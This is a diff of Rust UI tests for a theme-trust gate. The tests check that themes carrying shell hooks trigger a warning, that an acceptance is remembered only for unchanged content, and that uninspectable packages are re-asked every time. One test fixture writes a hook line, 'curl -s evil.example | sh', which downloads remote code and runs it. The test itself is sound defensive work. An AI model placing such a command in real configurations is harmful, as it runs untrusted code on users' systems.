@@ -19193,7 +19193,13 @@ fn entering_save_refreshes_theme_list_by_construction() {
 
 /// `src/main.rs`'s gate helper, driven through a real window: the flag,
 /// the payload, the confirm round trip and the panel Escape route.
+///
+/// `#[serial]`: the gate is a PROCESS-GLOBAL static, so two tests driving it
+/// at once would see each other's pending attempt (one would get `Blocked`
+/// where it expected `Hold`). Only the tests that actually apply themes need
+/// this; the render tests set the window's properties directly.
 #[test]
+#[serial_test::serial]
 fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
     use slint::ComponentHandle as _;
     use slint::Model as _;
@@ -19204,6 +19210,9 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
     // One package carrying a shell hook, one carrying neither hooks nor Lua.
     let tmp = tempfile::tempdir().unwrap();
     let root = tmp.path().join("themes");
+    // W2c: the store is driven in the temp dir, never the real one in the
+    // keeper's cache dir — a test must not touch live state.
+    let store_path = tmp.path().join("theme-trust.toml");
     let settings = root.join("Risky").join("providers").join("noctalia-v5");
     std::fs::create_dir_all(&settings).unwrap();
     std::fs::write(
@@ -19226,6 +19235,7 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
         let weak = win.as_weak();
         let root = root.clone();
         let names = names.clone();
+        let store_path = store_path.clone();
         win.on_gallery_card_clicked(move |idx| {
             let name = names[idx as usize].clone();
             let Some(w) = weak.upgrade() else { return };
@@ -19235,6 +19245,7 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
                 idx,
                 crate::theme_trust::ApplyOrigin::Gallery,
                 &root,
+                &store_path,
             ) {
                 applied.borrow_mut().push(name);
             }
@@ -19247,6 +19258,7 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
         let weak = win.as_weak();
         let root = root.clone();
         let names = names.clone();
+        let store_path = store_path.clone();
         win.on_panel_apply_saved_theme(move |idx| {
             let name = names[idx as usize].clone();
             let Some(w) = weak.upgrade() else { return };
@@ -19256,6 +19268,7 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
                 idx,
                 crate::theme_trust::ApplyOrigin::Panel,
                 &root,
+                &store_path,
             ) {
                 applied.borrow_mut().push(name);
             }
@@ -19292,15 +19305,45 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
     assert!(!win.get_trust_warning_open(), "confirming must close the warning");
     assert_eq!(win.get_panel_save_dialog_mode(), "");
 
-    // Applying that risky theme again warns again (consent is one-shot).
+    // W2c: that confirmation was REMEMBERED for exactly this content, so the
+    // same theme applies again in silence — the keeper answers once.
+    assert!(
+        store_path.is_file(),
+        "confirming a warning must persist the acceptance"
+    );
     win.invoke_gallery_card_clicked(0);
-    assert_eq!(gallery_applied.borrow().len(), 1, "held again");
-    assert!(win.get_trust_warning_open());
+    assert_eq!(
+        &*gallery_applied.borrow(),
+        &["Risky".to_string(), "Risky".to_string()],
+        "content the keeper already accepted must apply with no second warning"
+    );
+    assert!(
+        !win.get_trust_warning_open(),
+        "no warning is owed for content that was accepted"
+    );
+
+    // …and the acceptance is for the CONTENT, never for the name: a package
+    // whose content changed must be held again, warning and all.
+    std::fs::write(
+        settings.join("settings.toml"),
+        "[hooks]\nstarted = \"curl -s evil.example | sh\"\n",
+    )
+    .unwrap();
+    win.invoke_gallery_card_clicked(0);
+    assert_eq!(
+        gallery_applied.borrow().len(),
+        2,
+        "a package rewired after the acceptance must NOT apply in silence"
+    );
+    assert!(
+        win.get_trust_warning_open(),
+        "changed content must bring the warning back"
+    );
     win.invoke_trust_warning_cancelled();
     assert!(!win.get_trust_warning_open(), "Cancel must close the warning");
     assert_eq!(
         gallery_applied.borrow().len(),
-        1,
+        2,
         "declining must change nothing"
     );
 
@@ -19337,7 +19380,7 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
     win.invoke_gallery_card_clicked(1);
     assert_eq!(
         &*gallery_applied.borrow(),
-        &["Risky".to_string(), "Plain".to_string()],
+        &["Risky".to_string(), "Risky".to_string(), "Plain".to_string()],
         "a clean theme must apply exactly as before"
     );
     assert!(!win.get_trust_warning_open(), "a clean theme shows no warning");
@@ -19348,6 +19391,76 @@ fn theme_trust_warning_gates_both_apply_paths_until_the_keeper_confirms() {
         "a clean theme must apply on the panel path with no warning"
     );
     assert!(!win.get_trust_warning_open());
+}
+
+/// W2c spec S1, end to end: a package HVE could NOT inspect is applied on a
+/// confirmation but NEVER remembered. A file nobody could read can change
+/// inside without the report changing, so a record of it would let rewritten
+/// content apply on consent given to a description — the keeper is warned
+/// EVERY time, and the warning is told so it cannot promise otherwise.
+///
+/// `#[serial]`: it drives the process-global gate (see the test above).
+#[test]
+#[serial_test::serial]
+fn theme_trust_reasks_for_a_package_it_could_not_inspect() {
+    use slint::ComponentHandle as _;
+    init_test_platform();
+    let win = crate::MainWindow::new().unwrap();
+    crate::wire_theme_trust_gate(&win);
+
+    let tmp = tempfile::tempdir().unwrap();
+    let root = tmp.path().join("themes");
+    let store_path = tmp.path().join("theme-trust.toml");
+    let provider = root.join("Opaque").join("providers").join("noctalia-v5");
+    std::fs::create_dir_all(&provider).unwrap();
+    // A settings.toml no TOML parser reads: the detector reports the
+    // conservative "the hooks table could not be read" entry instead.
+    std::fs::write(provider.join("settings.toml"), "[hooks\nstarted = \"evil\"\n").unwrap();
+
+    let applied = std::rc::Rc::new(std::cell::RefCell::new(0usize));
+    {
+        let applied = applied.clone();
+        let weak = win.as_weak();
+        let root = root.clone();
+        let store_path = store_path.clone();
+        win.on_gallery_card_clicked(move |idx| {
+            let Some(w) = weak.upgrade() else { return };
+            if crate::trust_gate_request(
+                &w,
+                "Opaque",
+                idx,
+                crate::theme_trust::ApplyOrigin::Gallery,
+                &root,
+                &store_path,
+            ) {
+                *applied.borrow_mut() += 1;
+            }
+        });
+    }
+
+    win.invoke_gallery_card_clicked(0);
+    assert_eq!(*applied.borrow(), 0, "a package nobody inspected must be held too");
+    assert!(win.get_trust_warning_open());
+    assert!(
+        !win.get_trust_warning_remembered(),
+        "the warning must not promise a silence HVE will not keep"
+    );
+
+    // Confirming applies it — and records NOTHING.
+    win.invoke_trust_warning_confirmed();
+    assert_eq!(*applied.borrow(), 1, "confirming must apply exactly the held theme");
+    assert!(
+        !store_path.exists(),
+        "an uninspected package must leave no record at all"
+    );
+
+    // The next attempt asks again: that is the whole point of not recording it.
+    win.invoke_gallery_card_clicked(0);
+    assert_eq!(*applied.borrow(), 1, "the second attempt must be held too");
+    assert!(win.get_trust_warning_open(), "the warning is owed every time");
+    win.invoke_trust_warning_cancelled();
+    assert!(!win.get_trust_warning_open());
+    assert_eq!(*applied.borrow(), 1, "declining must change nothing");
 }
 
 /// The warning's copy is the honesty contract of this feature: it must
@@ -19370,6 +19483,24 @@ fn theme_trust_warning_copy_states_the_honest_limit() {
     assert!(lower.contains("shell hook"), "the copy must name the shell hooks");
     assert!(lower.contains("lua preset"), "the copy must name the Lua presets");
     assert!(lower.contains("cancel") && lower.contains("continue"), "both decisions must be offered");
+    // W2c: Continue is no longer a one-shot — the copy must SAY what it
+    // remembers, in both states, because the two states differ.
+    assert!(
+        lower.contains("continuing remembers this acceptance for this theme"),
+        "the copy must state that Continue remembers the acceptance"
+    );
+    assert!(
+        lower.contains("will not ask again while the content above stays exactly as it is"),
+        "the copy must scope the silence to the content the keeper was shown"
+    );
+    assert!(
+        lower.contains("this decision is not remembered"),
+        "a package that could not be inspected must not be presented as remembered"
+    );
+    assert!(
+        src.contains("root.acceptance-remembered"),
+        "the copy must branch on whether the decision can be remembered"
+    );
     for banned in [
         "prevents execution",
         "blocks execution",
@@ -19658,6 +19789,49 @@ fn theme_trust_warning_renders_over_the_gallery_and_over_the_panel() {
         count_buffer_diff(&gallery_open, &long_list) > 1000,
         "a long carrier list must change what is painted"
     );
+
+    // W2c: the OTHER branch of the copy — a package HVE could not inspect.
+    // It says the opposite thing about Continue. The card has a FIXED height
+    // and the carrier list is its only stretch item, so a longer paragraph
+    // can only eat into the list: the BUTTON row must stay exactly where it
+    // was, which is what the second assertion measures.
+    let one_hook = ModelRc::new(VecModel::from(vec![SharedString::from(
+        "started — sddm-watch.sh",
+    )]));
+    let no_presets = ModelRc::new(VecModel::from(Vec::<SharedString>::new()));
+    win.set_trust_warning_hooks(one_hook);
+    win.set_trust_warning_presets(no_presets);
+    settle();
+    let remembered_single = win
+        .window()
+        .take_snapshot()
+        .expect("gallery, one carrier, acceptance remembered");
+    save_slice_png(
+        remembered_single.clone(),
+        "trust_warning_gallery_remembered_single.png",
+    );
+
+    win.set_trust_warning_remembered(false);
+    settle();
+    let not_remembered = win
+        .window()
+        .take_snapshot()
+        .expect("gallery, decision that cannot be remembered");
+    save_slice_png(
+        not_remembered.clone(),
+        "trust_warning_gallery_not_remembered.png",
+    );
+    assert!(
+        count_buffer_diff_region(&remembered_single, &not_remembered, 660, 280, 1260, 786) > 100,
+        "the copy for an uninspected package must state the other outcome"
+    );
+    assert_eq!(
+        count_buffer_diff_region(&remembered_single, &not_remembered, 1020, 790, 1260, 850),
+        0,
+        "the buttons must NOT move when the copy changes: the fixed card height \
+         and the stretch carrier list absorb it"
+    );
+    win.set_trust_warning_remembered(true);
 
     win.set_trust_warning_open(false);
     settle();
